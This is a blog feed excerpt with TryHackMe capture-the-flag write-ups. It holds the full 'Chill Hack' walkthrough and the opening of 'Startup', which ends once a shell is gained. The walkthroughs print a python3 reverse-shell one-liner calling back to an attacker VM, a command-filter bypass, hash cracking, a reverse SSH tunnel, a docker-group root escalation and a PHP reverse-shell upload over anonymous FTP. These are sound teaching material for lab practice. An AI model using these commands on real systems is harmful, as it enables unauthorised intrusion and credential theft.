&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry><entry><title type="html">Chill Hack Write Up</title><link href="https://darrynbrownfield.co.uk/chillhack" rel="alternate" type="text/html" title="Chill Hack Write Up" /><published>2020-12-05T00:00:00+00:00</published><updated>2020-12-05T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/chillhack</id><content type="html" xml:base="https://darrynbrownfield.co.uk/chillhack">&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/cover.png&quot; alt=&quot;Chillhack&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/chillhack&quot;&gt;Chillhack&lt;/a&gt; is a great boot2root machine from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. Credit to &lt;a href=&quot;https://twitter.com/acharya_anurodh&quot;&gt;Anurodh&lt;/a&gt; for a great room. It felt like this machine had everything chaining lots of elements together to finally get SSH access as a user then a simple priv esc to root.  We have two tasks to complete, obtain the user and root flags.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.226.46
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-05 11:06 GMT
Nmap scan report for 10.10.226.46
Host is up (0.028s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;21 - FTP - Anonymous login allowed with a note.txt file&lt;/li&gt;
  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache web server version 2.4.29&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;First I had a look at the note on the FTP server. I logged in with the anonymous account and downloaded the file. The note reads:&lt;/p&gt;

&lt;p&gt;“Anurodh told me that there is some filtering on strings being put in the command – Apaar”&lt;/p&gt;

&lt;p&gt;No idea what this is related to yet so I started to look at the web server. I kicked off a gobuster while I had a click around the webpages.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.226.46 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.226.46
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/05 11:12:39 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/secret (Status: 301)
/server-status (Status: 403)
===============================================================
2020/12/05 11:14:34 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Clicking around didnt reveal much however the gobuster found the directory /secret&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/command.png&quot; alt=&quot;command&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This must be what the note is refering to. I started with some basics commands to see what was possible such as whoami, pwd, date which were all successful and returned a response.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/wwwdata.png&quot; alt=&quot;wwwdata&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However when I tried ls or ‘cat /etc/passwd’ I got an alert! However I didn’t get blocked so I could keep testing commands.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/hacker.png&quot; alt=&quot;hacker&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;Based on the recon so far I was confident my foothold would be via the /secret directory and bypassing the command filter I might be able to either get a SSH key or reverse shell.&lt;/p&gt;

&lt;p&gt;I tried testing various commands and found I was able to bypass the filter using quotes. When I tried to run ‘ls’ before it failed however when I put the command in quotes I get a response.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/lsworked.png&quot; alt=&quot;lsworked&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I started a netcat listener on my attacker VM I tried a couple of reverse shell one liners but finally got success with python3.&lt;/p&gt;

&lt;p&gt;`python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“ATTACK VM”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’`&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [ATTACK VM] from (UNKNOWN) [10.10.226.46] 45160
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We have a shell! Looking at index.php shows the blacklist.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;html&amp;gt;                                                                                                                             
&amp;lt;body&amp;gt;                                                                                                                             
                                                                                                                                   
&amp;lt;form method=&quot;POST&quot;&amp;gt;                                                                                                               
        &amp;lt;input id=&quot;comm&quot; type=&quot;text&quot; name=&quot;command&quot; placeholder=&quot;Command&quot;&amp;gt;                                                         
        &amp;lt;button&amp;gt;Execute&amp;lt;/button&amp;gt;                                                                                                   
&amp;lt;/form&amp;gt;                                                                                                                            
&amp;lt;?php                                                                                                                              
        if(isset($_POST['command']))                                                                                               
        {
                $cmd = $_POST['command'];
                $store = explode(&quot; &quot;,$cmd);
                $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
                for($i=0; $i&amp;lt;count($store); $i++)
                {
                        for($j=0; $j&amp;lt;count($blacklist); $j++)
                        {
                                if($store[$i] == $blacklist[$j])
                                {?&amp;gt;
                                        &amp;lt;h1 style=&quot;color:red;&quot;&amp;gt;Are you a hacker?&amp;lt;/h1&amp;gt;
                                        &amp;lt;style&amp;gt;
                                                body
                                                {
                                                        background-image: url('images/FailingMiserableEwe-size_restricted.gif');
                                                        background-position: center center;
                                                        background-repeat: no-repeat;
                                                        background-attachment: fixed;
                                                        background-size: cover;
        }
                                        &amp;lt;/style&amp;gt;
&amp;lt;?php                                    return;
                                }
                        }
                }
                ?&amp;gt;&amp;lt;h2 style=&quot;color:blue;&quot;&amp;gt;&amp;lt;?php echo shell_exec($cmd);?&amp;gt;&amp;lt;/h2&amp;gt;
                        &amp;lt;style&amp;gt;
                             body
                             {
                                   background-image: url('images/blue_boy_typing_nothought.gif');  
                                   background-position: center center;
                                   background-repeat: no-repeat;
                                   background-attachment: fixed;
                                   background-size: cover;
}
                          &amp;lt;/style&amp;gt;
        &amp;lt;?php }
?&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I can see 3 users ‘aurick’, ‘apaar’ and ‘anurodh’ however I could only access apaar’s directory but couldn’t read any files. I went back to /var/www to enumerate further and found the directory ‘files’. Looking at index.php I found a mysql username and password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ mysql -u root -p
mysql -u root -p
Enter password: 

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 6
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&amp;gt; show databases;                                            
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.00 sec)

mysql&amp;gt; use webportal;
use webportal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&amp;gt; show tables;
show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)

mysql&amp;gt; select * from users;
select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de2REDACTED      |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df05REDACTED      |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Found some users, the passwords look like md5 hashes so I created a file on my attack VM with both hashes in and then ran hashcat to crack them.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt --force                                         
hashcat (v5.1.0) starting...                                                                               
                                                                                                           
OpenCL Platform #1: The pocl project                                                                       
====================================                                                                       
* Device #1: pthread-Intel(R) Core(TM) i5-7500 CPU @ 3.40GHz, 512/1472 MB allocatable, 2MCU                
                                                                                                           
Hashes: 2 digests; 2 unique digests, 1 unique salts                                                        
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                               
Rules: 1                                                                                                   
                                                                                                           
Applicable optimizers:                                                                                     
* Zero-Byte                                                                                                
* Early-Skip                                                                                               
* Not-Salted                                                                                               
* Not-Iterated                                                                                             
* Single-Salt                                                                                              
* Raw-Hash                                                                                                 
                                                                                                           
Minimum password length supported by kernel: 0                                                             
Maximum password length supported by kernel: 256                                                           
                                                                                                           
ATTENTION! Pure (unoptimized) OpenCL kernels selected.                                                     
This enables cracking passwords and salts &amp;gt; length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

686216240e5af30df05REDACTED:&amp;lt;hidden&amp;gt;
7e53614ced3640d5de2REDACTED:&amp;lt;hidden&amp;gt;  
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: hashes
Time.Started.....: Sat Dec  5 12:08:01 2020 (3 secs)
Time.Estimated...: Sat Dec  5 12:08:04 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2713.5 kH/s (0.23ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 5736448/14344385 (39.99%)
Rejected.........: 0/5736448 (0.00%)
Restore.Point....: 5734400/14344385 (39.98%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: maston420 -&amp;gt; masta619

Started: Sat Dec  5 12:07:49 2020
Stopped: Sat Dec  5 12:08:05 2020
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Both hashes successfully cracked. I tried to use them to log in via SSH but that didn’t work. I went back to the /var/www/files directory to have a look at what was going on. When a user successfully logged in they were directed to hacker.php. Looking at the hacker.php the following code looked interesting:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;center&amp;gt;
        &amp;lt;img src = &quot;images/hacker-with-laptop_23-2147985341.jpg&quot;&amp;gt;&amp;lt;br&amp;gt;
        &amp;lt;h1 style=&quot;background-color:red;&quot;&amp;gt;You have reached this far. &amp;lt;/h2&amp;gt;
        &amp;lt;h1 style=&quot;background-color:black;&quot;&amp;gt;Look in the dark! You will find your answer&amp;lt;/h1&amp;gt;
&amp;lt;/center&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;My initial thought was steganography in the hacker image, there are lots of ways I could have copied the images to my attack machine however I could see the webpage was being hosted locally on port 9001 so I used SSH to tunnel the port so I could access the webpage.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ netstat -ntlp                                                                                 
netstat -ntlp                                                                                   
(Not all processes could be identified, non-owned process info                                  
 will not be shown, you would have to be root to see it all.)                                   
Active Internet connections (only servers)                                                      
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::21                   :::*                    LISTEN      -               
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On the ‘victim’ machine I issued the command ‘ssh -N -R ATTACKERVMIP:9001:127.0.0.1:9001 daz@ATTACKERVMIP’. Now on my attack VM I could web browse to 127.0.0.1:9001 and get access to the login page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I logged in with aurick credentials.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/9001.png&quot; alt=&quot;9001&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now its simple to just right click and download the hacker image to my machine.  Now the image in on my machine and check for any hidden files.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $steghide extract -sf hacker-with-laptop_23-2147985341.jpg
Enter passphrase:                                              
wrote extracted data to &quot;backup.zip&quot;.                          
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Using steghide I was able to extract a zip file. However the zip file was password protected.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $/usr/sbin/zip2john backup.zip &amp;gt; ziphash
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using zip2john I was able to generate the password hash. I extracted the hash from the ziphash output and put in to a new file called newzip. and used the hashcat to crack: hashcat -m 17200 newzip /usr/share/wordlists/rockyou.txt –force&lt;/p&gt;

&lt;p&gt;The password cracked successfully, I used the password to unzip the file and got source_code.php. Within the source code was a base64 encoded password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/ChillHack]
└──╼ $echo IWQwbnRLbjB3bREDACTED | base64 -d
&amp;lt;hidden&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I decoded the hash and tried to login using SSH. I was successful with the user anurodh.&lt;/p&gt;

&lt;p&gt;Once on the machine I did ‘sudo -l’ to check if there was a quick win to priv esc. I also checked the users home directory for the user flag, however it was not there.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;anurodh@ubuntu:/dev/shm$ sudo -l
Matching Defaults entries for anurodh on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anurodh may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No priv esc to root however I could run a script owned by apaar.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;anurodh@ubuntu:/$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: aurick   
Hello user! I am aurick,  Please enter your message: id    
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
Thank you for your precious time!
anurodh@ubuntu:/$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: aurick
Hello user! I am aurick,  Please enter your message: cat /home/apaar/local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qREDACTED}
Thank you for your precious time!
anurodh@ubuntu:/$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I was able to run commands as apaar, when I first got a foot hold one the machine I found a local.txt file in apaar’s home directory but was unable to read it. However now I can run commands as the apaar user so I used cat to read the file and got the user flag.&lt;/p&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;I did some enumeration using the apaar user by using the helpline.sh script and the command ‘bash -i’ to get shell on the box as the apaar user however I didnt find much so I went back to the anurodh user and ran linpeas.&lt;/p&gt;

&lt;p&gt;anurodh is a memeber of the docker group, this &lt;a href=&quot;https://www.hackingarticles.in/docker-privilege-escalation/&quot;&gt;blog&lt;/a&gt; details how a machine can be exploited via docker.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;anurodh@ubuntu:/dev/shm$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              a24bb4013296        6 months ago        5.57MB
hello-world         latest              bf756fb1ae65        11 months ago       13.3kB
anurodh@ubuntu:/dev/shm$ docker run -v /etc/:/mnt -it alpine
/ # cd /mnt
/mnt # cd root
/mnt/root # cat proof.txt 


                                        {ROOT-FLAG: w18gfpn9xehsgd3tovhREDACTED}


Congratulations! You have successfully completed the challenge.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thats root! Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry><entry><title type="html">Startup Write Up</title><link href="https://darrynbrownfield.co.uk/startup" rel="alternate" type="text/html" title="Startup Write Up" /><published>2020-11-21T00:00:00+00:00</published><updated>2020-11-21T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/startup</id><content type="html" xml:base="https://darrynbrownfield.co.uk/startup">&lt;p&gt;&lt;img src=&quot;/assets/images/startup/cover.jpg&quot; alt=&quot;Startup&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/startup&quot;&gt;Startup&lt;/a&gt; is an fun easy room from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. Credit to &lt;a href=&quot;https://twitter.com/elbee_ez&quot;&gt;r1gormort1s&lt;/a&gt; for a great room.  We have three tasks to complete, finding both the user and root flag and the secret ingredient in the spicy soup recipe.&lt;/p&gt;

&lt;p&gt;The description of the room is:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (incase you get hungry), but that is not why you are here. To be truthful, we aren’t sure if our developers know what they are doing and our security concerns are rising. We ask that you preform a thorough penetration test and try to own root. Good luck!&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, I’ve edited my /etc/hosts file with the name of the box and the assigned IP. I started by doing an nmap scan to check what ports are open.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
└──╼ $sudo nmap -sC -sV -oN nmap/initial startup
[sudo] password for daz: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-21 11:01 GMT
Nmap scan report for startup (10.10.27.29)
Host is up (0.026s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to (VPN IP)
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.35 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;21 - FTP - Anonymous login allowed which is interesting will need to check what files and access is available&lt;/li&gt;
  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache web server&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Starting with FTP (port 21) I logged in using anonymous as the username and password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]                       
└──╼ $ftp startup                                                    
Connected to startup.                                                
220 (vsFTPd 3.0.3)                                                   
Name (startup:daz): anonymous                                        
331 Please specify the password.                                     
Password:                                                            
230 Login successful.                                                
Remote system type is UNIX.                                          
Using binary mode to transfer files.
ftp&amp;gt; ls 
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp
-rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
226 Directory send OK.
ftp&amp;gt; cd ftp
250 Directory successfully changed.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp&amp;gt; ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 .
drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..
226 Directory send OK.
ftp&amp;gt; get important.jpg 
local: important.jpg remote: important.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for important.jpg (251631 bytes)
226 Transfer complete.
251631 bytes received in 0.10 secs (2.3400 MB/s)
ftp&amp;gt; get notice.txt 
local: notice.txt remote: notice.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notice.txt (208 bytes).
226 Transfer complete.
208 bytes received in 0.00 secs (4.1326 MB/s)
ftp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A few files are available including a txt file stating someone is uploading Among Us memes. (I know nothing about Among Us but my kids say its good….. I prefer Assassins Creed!). We do have a possible username of Maya.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
└──╼ $cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is
, but Maya is looking pretty sus.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But nothing else out of interest. So I turned my attention to HTTP (port 80).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/startup/index.png&quot; alt=&quot;index&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A very simple webpage and nothing really to note in the source.  So I ran a gobuster to check for other directories.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
└──╼ $gobuster dir -u http://startup -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://startup
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,html
[+] Timeout:        10s
===============================================================
2020/11/21 11:12:05 Starting gobuster
===============================================================
/files (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/11/21 11:22:32 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;‘/files’ looks interesting.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/startup/files.png&quot; alt=&quot;files&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This mirrors the files seen on the FTP service, so my first thought is to see if we can upload a reverse shell script via ftp and execute via the web.&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;The first step is to copy a web shell script in to our working directory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php 
┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
└──╼ $mv php-reverse-shell.php shell.php
┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
└──╼ $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I edited the script with my vpn IP and changed the port to 4444.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;set_time_limit (0);
$VERSION = &quot;1.0&quot;;
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next I uploaded the script via ftp.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
└──╼ $ftp startup
Connected to startup.
220 (vsFTPd 3.0.3)
Name (startup:daz): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; put shell.php 
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
553 Could not create file.
ftp&amp;gt; cd ftp
250 Directory successfully changed.
ftp&amp;gt; put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent in 0.00 secs (168.9849 MB/s)
ftp&amp;gt; exit
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I was unable to add to the initial directory however once I changed to the ‘ftp’ directory I was able to successfully upload the web shell script. Now I just need to navigate to the file in my browser.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/startup/webshell.png&quot; alt=&quot;webshell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have a shell!&lt;/p&gt;

